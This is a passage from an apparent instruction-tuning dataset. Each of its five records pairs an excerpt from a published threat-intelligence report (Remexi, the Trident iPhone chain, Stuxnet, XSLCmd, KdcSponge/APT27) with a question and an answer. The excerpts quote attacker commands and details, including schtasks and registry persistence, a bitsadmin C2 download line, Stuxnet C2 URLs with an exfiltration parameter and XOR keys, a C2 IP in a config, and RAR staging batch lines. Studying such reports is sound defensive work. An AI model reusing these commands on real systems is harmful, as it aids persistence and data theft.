    "instruction": "Big Headline: Technical analysis\nInside the binaries the compiler left references to the names of the C source file modules used: \"operation_reg.c\", \"thread_command.c\" and \"thread_upload.c\". Like mentioned in modules file names the malware consists of several working threads dedicated to different tasks, including C2 command parsing and data exfiltration. For both the receiving of C2 commands and exfiltration, Remexi uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with the C2 over HTTP.\nMedium Headline: Proliferation\nSo far, our telemetry hasn't provided any concrete evidence that shows us how the Remexi malware spread. However, we think it's worth mentioning that for one victim we found a correlation between the execution of Remexi\u00b4s main module and the execution of an AutoIt script compiled as PE, which we believe may have dropped the malware. This dropper used an FTP with hardcoded credentials to receive its payload. FTP server was not accessible any more at the time of our analysis.\nMedium Headline: Malware features\nRemexi boasts features that allow it to gather keystrokes, take screenshots of windows of interest (as defined in its configuration), steal credentials, logons and the browser history, and execute remote commands. Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim's data.\nRemexi includes different modules that it deploys in its working directory, including configuration decryption and parsing, launching victim activity logging in a separate module, and seven threads for various espionage and auxiliary functions. The Remexi developers seem to rely on legitimate Microsoft utilities, which we enumerate in the table below.\nMedium Headline: Persistence\nPersistence modules are based on scheduled tasks and system registry. Mechanisms vary for different OS versions. In the case of old Windows versions like XP, main module events.exe runs an edited XPTask.vbs Microsoft sample script to create a weekly scheduled task for itself. For newer operating systems, events.exe creates task.xml as follows:\nThen it creates a Windows scheduled task using the following command:\n1 schtasks.exe /create /TN \\\"Events\\\\CacheTask_<user_name_here>\" /XML \\\" <event_cache_dir_path>t /F\"\nAt the system registry level, modules achieve persistence by adding themselves into the key:\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\nwhen it finds possible add values to the Winlogon subkey, and in\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager. All such indicators of comprometation are mentioned in correspondent appendix below.\nMedium Headline: Configuration\nConfig.ini is the file where the malware stores its encrypted configuration data. It contains the following fields:\nMost of the parameters are self-explanatory. However, captureScreenTimeOut and captureActiveWindowTimeOut are worth describing in more detail as their programming logic is not so intuitive.\nOne of the malware threads checks in an infinite loop if the mouse button was pressed and then also increments the integer iterator infinitely. If the mouse hooking function registers a button hit, it lets the screenshotting thread know about it through a global variable. After that, it checks if the iterator divided by (captureScreenTimeOut/captureActiveWindowTimeOut) has a remainder of 0. In that case, it takes a screenshot.\nMedium Headline: Main module (events.exe)\nAfter checking that the malware is not already installed, it unpacks HCK.cab using the Microsoft standard utility expand.exe with the following arguments:\n1 expand.exe -r \\\"<full path to HCK.cab>\\\" -f:* \\\"<event_cache_dir_path>\\\\\\\"\nThen it decrypts config.ini file with a hardcoded 25-byte XOR key that differs for every sample. It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc() functions respectively and starts several working threads:\nID Thread description\nThe malware uses the following command to receive data from its C2:\n1 bitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal <server>\n2 <file>\nhttp://<server_config>/asp.asp?ui=<host_name>nrg-<adapter_info>-<user_name>\nBig Headline: Attribution\nThe Remexi malware has been associated with an APT actor called by Symantec.\nOne of the human-readable encryption keys used is \"salamati\". This is probably the Latin spelling for the word \"health\" in Farsi. Among the artifacts related to malware authors, we found in the binaries a .pdb path containing the Windows user name \"Mohamadreza New\". Interestingly, the FBI website for wanted cybercriminals includes two Iranians called , although this could be a common name or even a false flag.\nQuestion: How does the Remexi malware, associated with the APT actor known as Chafer, utilize the Microsoft Background Intelligent Transfer Service (BITS) for communication with its Command and Control (C2) server? Why might the attackers prefer this method over other communication techniques?",
    "output": "Answer: The Remexi malware uses the Microsoft Background Intelligent Transfer Service (BITS) mechanism to communicate with its C2 server over HTTP for both receiving commands and exfiltrating data. This method is preferred because BITS is a legitimate Windows service used for downloading updates and other background transfers, making it less likely to raise suspicion or be blocked by security software. By leveraging BITS, the malware can blend in with normal system activity, enhancing its stealth capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 2. Ahmed Mansoor Targeted With iPhone Zero-Day\nAhmed Mansoor is an (<https://www.amnesty.org/en/latest/news/2015/10/ahmed-mansoor-selected-as-the-2015-laureate-martin-ennals-award-for-human-rights-defenders/>)internationally recognized human rights defender, blogger, and member of Human Rights Watch's (<https://www.hrw.org/news/2011/04/09/uae-government-detains-human-rights-defender>)advisory committee. Mansoor, who is based in the UAE, was jailed for eight months in 2011 along with four other activists for (<https://www.hrw.org/news/2011/09/22/uae-free-activists-elections>)supporting a pro-democracy petition. After he was released, Mansoor's (<http://www.martinennalsaward.org/index.php?option=com_content&view=article&id=254%3Aahmed-mansoor-martin-ennals-award-2015-final-nominee&catid=44%3Apress&Itemid=152&lang=en>)passport was confiscated, his (<http://www.nytimes.com/2016/05/30/technology/governments-turn-to-commercial-spyware-to-intimidate-dissidents.html>)car was stolen, and $140,000 disappeared from his bank account. Mansoor is banned from traveling overseas, and his work continues to attract significant harassment and punishment\nOn the morning of August 10, 2016, Mansoor received an SMS text message that appeared suspicious. The next day he received a second, similar text. The messages promised \"new secrets\" about detainees tortured in UAE prisons, and contained a hyperlink to an unfamiliar website. The messages arrived on Mansoor's stock iPhone 6 running iOS 9.3.3.\nMansoor quickly forwarded the messages to Citizen Lab researchers for investigation. He has good reason to be concerned about unsolicited messages: every year since 2011, Mansoor has been targeted with spyware attacks, including with FinFisher spyware in 2011 and (<https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/>)Hacking Team spyware in (<https://citizenlab.org/2012/10/backdoors-are-forever-hacking-team-and-the-targeting-of-dissent/>)2012 (see Section 8: Ahmed Mansoor and Previous UAE Attacks ).\nMedium Headline: Figure 3: SMS text messages received by Mansoor (English: \"New secrets about torture of Emiratis in state prisons\"). The sender's phone numbers are spoofed.\nWhen Mansoor's messages reached us, we recognized the links: the domain name webadv.co belongs to a network of domains that we believe to be part of an exploit infrastructure provided by the spyware company NSO Group (see Section 6: Linking NSO Group Products to the Attack on Mansoor). We had first come across the NSO Group infrastructure during the course of our earlier research into (<https://citizenlab.org/2016/05/stealth-falcon/>)Stealth Falcon, a UAE-based threat actor (see Section 5: Tracking a Mobile Attack Infrastructure).\nWhen we first found the infrastructure and connected it to NSO Group, we hypothesized that operators of the NSO Group spyware would target a user by sending them an infection link containing one of the exploit infrastructure domain names. Though we had previously found several public occurrences of links involving these domains on Twitter (see Section 7: Evidence of Other Targets), none of the links we found seemed to be active (i.e., none produced an infection when we tested them). In other exploit infrastructures with which we are familiar (e.g., (<https://wikileaks.org/hackingteam/emails/emailid/121783>)Hacking Team's exploit infrastructure), we had noted that operators prefer to deactivate such links after a single click, or after a short period of time, perhaps in order to prevent the disclosure of the exploit to security researchers.\nWe accessed the link Mansoor provided us on our own stock factory-reset iPhone 5 (Mansoor had an iPhone 6) with iOS 9.3.3 (the same version as Mansoor). When we clicked the link, we saw that it was indeed active, and watched as unknown software was remotely implanted on our phone. This suggested that the link contained a zero-day iPhone remote jailbreak: a chain of heretofore unknown exploits used to remotely circumvent iPhone security measures. To verify our observations, we shared our findings with Lookout Security. Both research teams determined that Mansoor was targeted with a zero-day iPhone remote jailbreak. The chain of exploits, which we are calling the Trident, included the following (see Section 4: The Trident iOS Exploit Chain and Payload for more details):\nThe implant installed by the Trident exploit chain would have turned Mansoor's iPhone into a digital spy in his pocket. The spyware, which appears to be NSO's Pegasus spyware solution, was capable of employing his iPhone's camera and microphone to eavesdrop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements.\nBig Headline: 3. NSO Group and the Pegasus Solution\nThe attack on Mansoor appears to have used Pegasus, a remote monitoring solution sold by (<http://www.haaretz.com/israel-news/business/1.574805>)NSO Group Technologies Ltd (see Section 6: Linking NSO Group Products to the Attack on Mansoor). NSO Group, based in Herzelia, Israel (CR# 514395409), develops and sells mobile phone surveillance software to governments around the world. The company describes itself as a \"leader\" in \"(<https://www.documentcloud.org/documents/815991-1276-nso-group-brochure-pegasus.html>)mobile and cellular Cyber Warfare,\" and has been operating for more than six years since its founding in 2010.\nNSO Group has largely avoided the kind of high profile media attention that companies like Hacking Team and FinFisher have sometimes courted. The company maintains no website, there is little concrete information about NSO Group's Pegasus product available online, and we know of no prior technical analysis of NSO Group's products or infrastructure.\nSome previous media reports have linked (<http://foreignpolicy.com/2016/01/22/the-espionage-econom>)NSO Group (<http://impresa.prensa.com/panorama/Virzi-ligado-compra-equipo-Pegasus_0_4267073341.html>)and Pegasus to a scandal involving potential illegal eavesdropping in Panama, and possible (<https://privacyinternational.org/sites/default/files/global_surveillance.pdf>)sales to Mexico. Other reports have suggested that NSO Group's activities have (<http://blogs.wsj.com/digits/2014/08/01/can-this-israeli-startup-hack-your-phone/>)aroused concern within the United States intelligence community .\nTwo of NSO Group's three co-founders, Shalev Hulio and Omri Lavie, are also co-founders of mobile security company Kaymera, which promises a \"Multi Layered Cyber Defense Approach\" to clients. On Kaymera's website, the company reprints a Bloomberg article pointing out that they \"(<https://www.kaymera.com/httpwww-bloomberg-comnews2014-09-29israeli-entrepreneurs-play-both-sides-of-the-cyber-wars-html/>)play both sides of the cyber wars.\" The article also quotes NSO Group's CEO, who suggests that they entered the defense business when potential clients saw the capabilities of NSO Group's tools.\n\nWhy was the discovery of the Trident exploit chain considered a rare and significant find in the field of cybersecurity? What implications does this discovery have for future research and defense against similar attacks?",
    "output": "The discovery of the Trident exploit chain was considered a rare and significant find because it represented the first known instance of an iPhone remote jailbreak used in the wild as part of a targeted attack campaign. This discovery highlighted the sophistication and potential impact of zero-day exploits on widely used devices like iPhones. The implications for future research and defense include the need for continuous monitoring and analysis of exploit infrastructures, improved collaboration between security researchers, and enhanced awareness among users about the risks associated with unsolicited messages and links. Additionally, it underscores the importance of developing robust security measures to protect against advanced and evolving cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Windows Win32k.sys Local Privilege Escalation (MS10-073)\nStuxnet exploited a 0-day vulnerability in win32k.sys, used for local privilege escalation. The vulnerability was patched on October 12, 2010. The vulnerability resides in code that calls a function in a function pointer table; however, the index into the table is not validated properly allowing code to be called outside of the function table.\nThe installation routine in Export 15, extracts and executes Resource 250, which contains a DLL that invokes the local privilege escalation exploit. The DLL contains a single export\u2014Tml_1. The code first verifies that the execution environment isn't a 64-bit system and is Windows XP or Windows 2000.\nIf the snsm7551.tmp file exists execution ceases, otherwise the file ~DF540C.tmp is created, which provides an in-work marker.\nNext, win32k.sys is loaded into memory and the vulnerable function table pointer is found. Next, Stuxnet will examine the DWORDs that come after the function table to find a suitable DWORD to overload as a virtual address that will be called. When passing in an overly large index into the function table, execution will transfer to code residing at one of the DWORDs after the function table. These DWORDs are just data used elsewhere in win32k. sys, but hijacked by Stuxnet. For example, if the ASCII string 'aaaa' (DWORD 0x60606060) is located after the function table, Stuxnet will allocate shellcode at address 0x60606060 and then pass in an overly large function table index that points to the DWORD 'aaaa' (0x60606060).\nBecause the available space at the address (in the above example 0x60606060) may be limited, Stuxnet uses a two stage shellcode strategy. Memory is allocated for the main shellcode and at the chosen hijacked address, Stuxnet only places a small piece of shellcode that will jump to the main shellcode.\nNext, Stuxnet drops a malformed keyboard layout file into the Temp directory with the file name ~DF<random>. tmp. The malformed keyboard layout file contains a byte that will result in the overly large index into the function table. NtUserLoadKeyboardLayoutEx is called to load the malformed keyboard layout file successfully invoking the exploit. The original keyboard layout is restored and then the malformed keyboard layout file is deleted.\nThe shellcode then loads the main Stuxnet DLL in the context of CSRSS.EXE.\nBig Headline: Load Point\nStuxnet drops Resource 242 MrxCls.sys via Export 16. MrxCls is a driver digitally signed with a compromised Realtek certificate that was revoked on July 16, 2010 by Verisign. A different version of the driver was also found signed by a different compromised digital certificate from JMicron.\nMrxcls.sys is a driver that allows Stuxnet to be executed every time an infected system boots and thus acts as the main load-point for the threat. The driver is registered as a boot start service creating the registry key HKEY_ LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MRxCls\\\"ImagePath\" = \"%System%\\drivers\\mrxcls.sys\" and thus loading early in the Windows boot process.\nThe goal of the driver is to inject and execute copies of Stuxnet into specific processes.\nThe driver contains an encrypted data block. After decryption, this block contains (among others) a registry key/ value pair, which is normally HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MrxCls\\\"Data\".\nThe driver reads this binary value (previously set by Stuxnet during the installation process). The value is decrypted. It contains a list of pairs (target process name, module to inject):\n\u2022 services.exe \u2014 %Windir%\\inf\\oem7A.PNF\n\u2022 S7tgtopx.exe \u2014 %Windir%\\inf\\oem7A.PNF\n\u2022 CCProjectMgr.exe \u2014 %Windir%\\inf\\oem7A.PNF\n\u2022 explorer.exe \u2014 %Windir%\\inf\\oem7m.PNF\nThe services.exe, s7tgtopx.exe (Simatic manager) and CCProjectMgr.exe (WinCC project manager) will be injected with oem7a.pnf, which is a copy of the main Stuxnet dll. Once injected, Stuxnet executes on the compromised computer.\nExplorer.exe is injected with oem7m.pnf, an unknown file, which does not appear to be dropped by Stuxnet.\nBig Headline: Command and Control\nAfter the threat has installed itself, dropped its files, and gathered some information about the system it contacts the command and control server on port 80 and sends some basic information about the compromised computer to the attacker via HTTP. Two command and control servers have been used in known samples:\n\u2022 www[.]mypremierfutbol[.]com\n\u2022 www[.]todaysfutbol[.]com\nThe two URLs above previously pointed to servers in Malaysia and Denmark; however they have since been redirected to prevent the attackers from controlling any compromised computers. The threat has the capability to update itself with new command and control domains, but we have not seen any files with updated configurations as yet. A configuration file named %Windir%\\inf\\mdmcpq3.PNF is read and the updated configuration information from that file is written to the main dll and the checksum of the dll is recalculated to ensure it is still correct.\nSystem data is gathered by export 28 and consists of the following information in the following format:\nPart 1:\nNote that the payload contains the machine and domain name, as well as OS information. The flags at offset 11h have the 4th bit set if at least one of the two registry values is found:\n\u2022 HKEY_LOCAL_MACHINE\\Software\\Siemens\\Step7, value: STEP7_Version\n\u2022 HKEY_LOCAL_MACHINE\\Software\\Siemens\\WinCC\\Setup, value: Version\nThis informs the attackers if the machine is running the targeted ICS programming software Siemens Step7 or WinCC.\nThe payload data is then XOR-ed with the byte value 0xFF.\nAfter the data is gathered, export #29 will then be executed (using the previously mentioned injection technique) to send the payload to a target server. The target process can be an existing Internet Explorer process (iexplore. exe), by default or if no iexplore.exe process is found the target browser process will be determined by examining\nthe registry key HKEY_CLASSES_ROOT\\HTTP\\SHELL\\OPEN\\COMMAND. A browser process is then created and injected to run Export #29.\nExport #29 is used to send the above information to one of the malicious Stuxnet servers specified in the Configuration Data block. First, one of the two below legitimate web servers referenced in the Configuration Data block are queried, to test network connectivity:\n\u2022 www.windowsupdate.com\n\u2022 www.msn.com\nIf the test passes, the network packet is built. It has the following format:\nThe payload is then XOR-ed with a static 31-byte long byte string found inside Stuxnet:\n0x67, 0xA9, 0x6E, 0x28, 0x90, 0x0D, 0x58, 0xD6, 0xA4, 0x5D, 0xE2, 0x72, 0x66, 0xC0, 0x4A, 0x57, 0x88, 0x5A, 0xB0, 0x5C, 0x6E, 0x45, 0x56, 0x1A, 0xBD, 0x7C, 0x71, 0x5E, 0x42, 0xE4, 0xC1\nThe result is \u00ab hexified \u00bb (in order to transform binary data to an ascii string). For instance, the sequence of bytes (0x12, 0x34) becomes the string \"1234\".\nThe payload is then sent to one of the two aforementioned URLs, as the \"data\" parameter. For example: [http://]www.mypremierfutbol.com/index.php?data=1234...\nUsing the HTTP protocol as well as pure ASCII parameters is a common way by malware (and legitimate applications for that matter) to bypass corporate firewall blocking rules.\nThe malicious Stuxnet server processes the query and may send a response to the client. The response payload is located in the HTTP Content section. Contrary to the payload sent by the client, it is pure binary data. However, it is encrypted with the following static 31-byte long XOR key:\n0xF1, 0x17, 0xFA, 0x1C, 0xE2, 0x33, 0xC1, 0xD7, 0xBB, 0x77, 0x26, 0xC0, 0xE4, 0x96, 0x15, 0xC4, 0x62, 0x2E, 0x2D, 0x18, 0x95, 0xF0, 0xD8, 0xAD, 0x4B, 0x23, 0xBA, 0xDC, 0x4F, 0xD7, 0x0C\nThe decrypted server response has the following format:\nDepending on the command byte, the payload module is either loaded in the current process, or in a separate process via RPC. Then, the payload module's export #1 is executed.\nThis feature gave Stuxnet backdoor functionality, as it had the possibility (before the *futbol* domains were blocked) to upload and run any code on an infected machine. At the time of writing no additional executables were detected as being sent by the attackers, but this method likely allowed them to download and execute additional tools or deliver updated versions of Stuxnet.\nFigure 12\nCommand and Control\n\nQ: How did Stuxnet exploit the Windows Win32k.sys local privilege escalation vulnerability (MS10-073), and what steps did it take to ensure successful execution of its shellcode?",
    "output": "A: Stuxnet exploited a 0-day vulnerability in win32k.sys for local privilege escalation. The vulnerability resided in code that called a function in a function pointer table without proper validation of the index. Stuxnet extracted and executed a DLL containing the exploit, which first verified that the environment wasn't a 64-bit system and was either Windows XP or Windows 2000. It then created a temporary file to act as an in-work marker. Stuxnet loaded win32k.sys into memory, found the vulnerable function table pointer, and searched for a suitable DWORD to overload as a virtual address. By passing an overly large index into the function table, execution transferred to the hijacked DWORD. Stuxnet used a two-stage shellcode strategy, placing a small piece of shellcode at the hijacked address that jumped to the main shellcode. It then dropped a malformed keyboard layout file to invoke the exploit, restoring the original layout afterward.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: XSLCmd for OS X Analysis\nThe XSLCmd backdoor for OS X was submitted to VirusTotal (MD5: 60242ad3e1b6c4d417d4dfeb8fb464a1) on August 10, 2014, with 0 detections at the time of submission. The sample is a universal Mach-O executable file supporting the PowerPC, x86, and x86-64 CPU architectures. The code within contains both an installation routine that is carried out the first time it is executed on a system, and the backdoor routine which is carried out after confirming that its parent process is launchd (the initial user mode process of OS X that is responsible for, amongst other things, launching daemons).\nThe backdoor code was ported to OS X from a Windows backdoor that has been used extensively in targeted attacks over the past several years, having been updated many times in the process. Its capabilities include a reverse shell, file listings and transfers, installation of additional executables, and an updatable configuration. The OS X version of XSLCmd includes two additional features not found in the Windows variants we have studied in depth: key logging and screen capturing.\nBig Headline: Installation Routine\nTo install, XSLCmd first determines the endianness of the CPU using NXGetLocalArchInfo and whether or not it is running as the super user by comparing the return value of getuid()with 0. The code includes functions to handle endianness differences when dealing with file and network data on a system using big endian, namely older Apple computers that shipped with PowerPC CPUs. The process copies its Mach-O from its current location to $HOME/Library/LaunchAgents/clipboardd and creates a plist file in the same directory with the name com.apple.service.clipboardd.plist. The latter file ensures that the backdoor is launched after the system is rebooted once the user logs in. After this is done, the malware relaunches itself using the 'load' option of the launchctl utility, which runs the malware according to its configuration in the plist file it created, with launchd as its parent process. This is the process that begins the actual backdoor routine of waiting for and executing commands issued from the C2 server.\nAfter running itself with launchctl, the initial process forks and deletes the Mach-O from the original location from which it was executed. The installation routine differs slightly depending on whether or not the process is running with super user privileges. If run as super user, it copies itself to /Library/Logs/clipboardd. Interestingly, if run as super user, the process will also copy /bin/ksh to /bin/ssh. /bin/ksh is the Korn shell executable, and if the user sends a command to initialize a reverse shell, it will use the copy of ksh to do so instead of /bin/bash.\nThis is likely done to make it less obvious that a reverse shell is running on the system, since it may raise less suspicion to see an ssh process opening a network socket rather than a bash process, although the real ssh executable is actually located in /usr/bin/ssh, not /bin/ssh. A list of possible files created by XSLCmd is included in Appendix 1 at the end of this blog.\nBig Headline: Configuration Options\nXSLCmd ships with an encrypted configuration file that it defaults to if there is no configuration file written to disk. It will only write its configuration file to disk if it's updated by the user. It runs in a loop, checking for a configuration update, and then checking for commands. If a new configuration is available, it will be written to disk in base64 encoding at $HOME/.fontset/pxupdate.ini. Below is the configuration data stored in the XSLCmd sample we obtained.\n[ListenMode]\n0\n[MServer]\n61.128.110.38:8000\n[BServer]\n61.128.110.38\n[Day]\n1,2,3,4,5,6,7\n[Start Time]\n00:00:00\n[End Time]\n23:59:00\n[Interval]\n60\n[MWeb]\nhttp://1234/config.htm\n[BWeb]\nhttp://1234/config.htm\n[MWebTrans]\n0\n[BWebTrans]\n0\n[FakeDomain]\nwww.appleupdate.biz\n[Proxy]\n0\n[Connect]\n1\n[Update]\n0\n[UpdateWeb]\nnot use\n[MServer] and [BServer] specify the main and backup C2 server addresses, which can be either an IP address or domain name. Only [MServer] needs to specify a port.\n[Day] specifies which days of the week the malware will poll for commands and configuration updates on where Monday is 1.\n[Start Time] specifies the local time of day to begin polling.\n[End Time] specifies the local time of day to stop polling.\n[Interval] specifies the number of seconds between polls.\n[MWeb] and [BWeb] specify the main and backup URLs to poll for configuration updates, respectively. Update checks are not performed if these values are left to their default: http://1234/config.htm\nOther options will be explained where appropriate later in the blog.\nBig Headline: C2 Protocol\nXSLCmd uses pseudo-HTTP for its protocol. It opens a socket and uses a string template to setup the HTTP request or response headers depending on whether or not it was configured for [Listen Mode]. If [Listen Mode] is set to 1, then it listens on its socket, waiting for a connection for which it will reply to with HTTP response headers following this template:\nHTTP/1.1 200 OK\nCache-Control: no-cache\nContent-Type: application/x-www-form-urlencoded\nServer: Apache/2.0.54 (Unix)\nContent-Encoding: gzip\nContent-Length: %d\nThe body after the headers, regardless of mode, will contain data specific to the purpose of the communication. The data is encrypted with a scheme lifted from a game server engine written by a group named \"(<http://read.pudn.com/downloads146/ebook/635386/src/gameserver/encdec.cpp__.htm>)My Destiny Team.\" The request headers have an interesting feature where the Host and Referer header values will have their domain values populated with the value stored in [Fake Domain]. This value can be any string and has no effect on the network connection established. The value of the 's' argument in the request URL is randomly generated, and all of the other request header values except for Content-Length are hard-coded.\nAnother interesting feature exists for the configuration update function. If [MWebTrans]/[BWebTrans] is set to 1, the configuration update URL request will be proxied through Yahoo's Babelfish service and will fall back to the Google Translate service if that fails.\nAs you can see, the 'trurl' parameter in the URL will be set to whatever is configured for [MWeb]/[BWeb]. The User-Agent header for this request is hard-coded and contains the computer name in the parentheses at the end.\nSSL certificate strings were noticed during our analysis, but with no direct cross-reference to the certificate data.\nHowever, there was a cross-reference to the data directly preceding it. This data began with what looked like SSL handshake headers, so we extracted the data from the executable, wrapped it in a PCAP file, and opened it in Wireshark.\nInterestingly, the data contains everything needed for the server-side packets of an SSL handshake. The SSL certificate being used was for login.live.com and had expired on 6/16/2010. The code using this data opens a socket, waits for a connection, and proceeds to carry out an SSL handshake with the client, throwing away whatever data it receives. This code is not directly referenced by any other code in the executable but could very well replace the [Listen Mode] code. Perhaps it is an old feature no longer in use, a new feature yet to be fully implemented, or an optional feature only used in certain cases.\nBig Headline: Observations\nWe noticed a mix of manually constructed and plain referenced strings throughout the code, sometimes side-by-side in the same function even. This gives the impression of someone working with someone else's code, adding his own touch and style here and there as he goes.\nAlso of note is that XSLCmd will not perform key logging if run as super user. This can be a problem, because the API used to perform the key logging, CGEventTapCreate, when invoked with the parameters it uses, requires root permissions\nfrom the calling process or the \"Assistive Devices\" feature must be enabled for the application. During the initial installation, there is a routine to (<http://hints.macworld.com/article.php?story=20060203225241914>)programmatically enable assistive devices that will be executed if the OS X version is not 10.8. In 10.9, enabling assistive devices permissions is done on a per application basis with no direct API to achieve this.\nIt is interesting to note that the version check does not account for versions above 10.8, indicating that perhaps 10.8 was the latest version at the time the code was written, or at least the most common. Further supporting this inference is the lack of testing performed on 10.9. This variant uses an API from the private Admin framework that is no longer exported in 10.9, causing it to crash. The effort to support PowerPC with the endian conversion functions is worth mentioning.\nCoupling this observation with the aforementioned fact that elsewhere in the code, the version of OS X is compared with 10.8, one could deduce that efforts were made to be backwards compatible with older OS X systems. For some frame of reference, Apple's first OS to drop support for PowerPC was OS X 10.6 released in 2009, and OS X 10.9 was released in October of 2013.\nRead the text above and answer this question: How does the XSLCmd backdoor handle its configuration options, and what happens when a new configuration is available?",
    "output": "XSLCmd ships with an encrypted configuration file that it defaults to if there is no configuration file written to disk. It runs in a loop, checking for configuration updates and commands. If a new configuration is available, it will be written to disk in base64 encoding at $HOME/.fontset/pxupdate.ini. The configuration options include settings for C2 servers, polling times, intervals, and update URLs, among others.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Function Hex bytes\nkdcsvc.KerbFreeKey 40 53 48 83 EC 20 48 8B D9 48 8B 49 10 48 85 C9 0F 85 B4 B9 01 00 33 C0 48 89 03 48 89 43\nTable 2. Undocumented functions and byte sequences used by KdcSponge to locate the sought after functions.\nOnce the KdcVerifyEncryptedTimeStamp, KerbHashPasswordEx3 and KerbFreeKey functions are found, the sample will attempt to hook these functions to monitor all calls to them with the intention to steal credentials. When a request to authenticate to the domain controller comes in, these functions in the Kerberos service (KDC service) are called, and the sample will capture the inbound credentials. The credentials are then written to disk at the following location:\n%ALLUSERPROFILE%\\Microsoft\\Windows\\Caches\\system.dat\nThe stolen credentials are encrypted with a single-byte XOR algorithm using 0x55 as the key and written to the system.dat file one per line in the following structure:\n[<timestamp>]<domain><username> <cleartext password>\nBig Headline: Attribution\nWhile attribution is still ongoing and we have been unable to validate the actor behind the campaign, we did observe some correlations between the tactics and tooling used in the cases we analyzed and Threat Group 3390 (TG-3390, (<https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/>)Emissary Panda, APT27).\nSpecifically, as documented by SecureWorks in an article on a (<https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage>)previous TG-3390 operation, we can see that TG-3390 similarly used web exploitation and another popular Chinese webshell called ChinaChopper for their initial footholds before leveraging legitimate stolen credentials for lateral movement and attacks on a domain controller. While the webshells and exploits differ, once the actors achieved access into the environment, we noted an overlap in some of their exfiltration tooling.\nSecureWorks stated the actors were using WinRar masquerading as a different application to split data into RAR archives within the Recycler directory. They provided the following snippet from a Batch file deployed to do this work:\n@echo off c:\\windows\\temp\\svchost.exe a -k -r -s -m5 -v1024000 -padmin-windows2014 \"e:\\recycler\\REDACTED.rar\" \"e:\\ProgramData\\REDACTED\\\" Exit\nFrom our analysis of recent attacks on ManageEngine ADSelfService Plus, we observed the same technique \u2013 with the same order and placement of the parameters passed to a renamed WinRar application.\n@echo off dir %~dp0>>%~dp0\\log.txt\n%~dp0\\vmtools.exe a -k -r -s -m5 -v4096000 -pREDACTED \"e:\\$RECYCLE.BIN\\REDACTED.rar\" \"E:\\Programs\\REDACTED\\REDACTED\"\nOnce the files had been staged, in both cases they were then made accessible on externally facing web servers. The threat actors would then download them through direct HTTP GET requests.\nBig Headline: Conclusion\nIn September 2021, Unit 42 observed an attack campaign in which the actors gained initial access to targeted organizations by exploiting a recently patched vulnerability in Zoho's ManageEngine product, ADSelfService Plus, tracked in CVE-2021-40539. At least nine entities across the technology, defense, healthcare, energy and education industries were compromised in this attack campaign.\nAfter exploitation, the threat actor quickly moved laterally through the network and deployed several tools to run commands in order to carry out their post-exploitation activities. The actor heavily relies on the Godzilla webshell, uploading several variations of the open-source webshell to the compromised server over the course of the operation. Several other tools have novel characteristics or have not been publicly discussed as being used in previous attacks, specifically the NGLite backdoor and the KdcSponge stealer. For instance, the NGLite backdoor uses a novel C2 channel involving the decentralized network known as the NKN, while the KdcSponge stealer hooks undocumented functions to harvest credentials from inbound Kerberos authentication attempts to the domain controller.\nUnit 42 believes that the actor's primary goal involved gaining persistent access to the network and the gathering and exfiltration of sensitive documents from the compromised organization. The threat actor gathered sensitive files to a staging directory and created password-protected multi-volume RAR archives in the Recycler folder. The actor exfiltrated the files by directly downloading the individual RAR archives from externally facing web servers.\nThe following coverages across the Palo Alto Networks platform pertain to this incident:\nThreat Prevention signature ZOHO corp ManageEngine Improper Authentication Vulnerability was released on Sept. 20 as threat ID 91676.\nNGLite backdoor is blocked by Cortex XDR's local analysis.\nAll known samples (Dropper, NGLite, KdcSponge) are classified as malware in .\nCortex Xpanse can accurately identify Zoho ManageEngine ADSelfServicePlus, ManageEngine Desktop Central, or ManageEngine ServiceDeskPlus Servers across customer networks.\nIf you think you may have been impacted, please email (<mailto:unit42-investigations@paloaltonetworks.com>)unit42-investigations@paloaltonetworks.com or call (866) 486-4842 \u2013 (866) 4-UNIT42 \u2013 for U.S. toll free, (31-20) 299-3130 in EMEA or (65) 6983-8730 in JAPAC. The (<https://www.paloaltonetworks.com/cortex/incident-response>)Unit 42 Incident Response team is available 24/7/365.\nSpecial thanks to Unit 42 Consulting Services and the NSA Cybersecurity Collaboration Center for their partnership, collaboration and insights offered in support of this research.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the (<http://www.cyberthreatalliance.org/>)Cyber Threat Alliance.\n\nQ: What similarities exist between the tactics used by the threat actor in the ManageEngine ADSelfService Plus attacks and those previously attributed to Threat Group 3390 (Emissary Panda, APT27)?",
    "output": "A: The tactics used by the threat actor in the ManageEngine ADSelfService Plus attacks share similarities with those of Threat Group 3390 (Emissary Panda, APT27). Both groups used web exploitation for initial access and employed webshells (Godzilla in the current case, ChinaChopper in TG-3390's case) to gain a foothold. Additionally, both groups leveraged legitimate stolen credentials for lateral movement and attacks on a domain controller. Furthermore, there is an overlap in their exfiltration tooling, where both used WinRar masquerading as a different application to split data into RAR archives within the Recycler directory. The batch file snippets show similar parameter usage and placement, indicating a common technique for data staging and exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
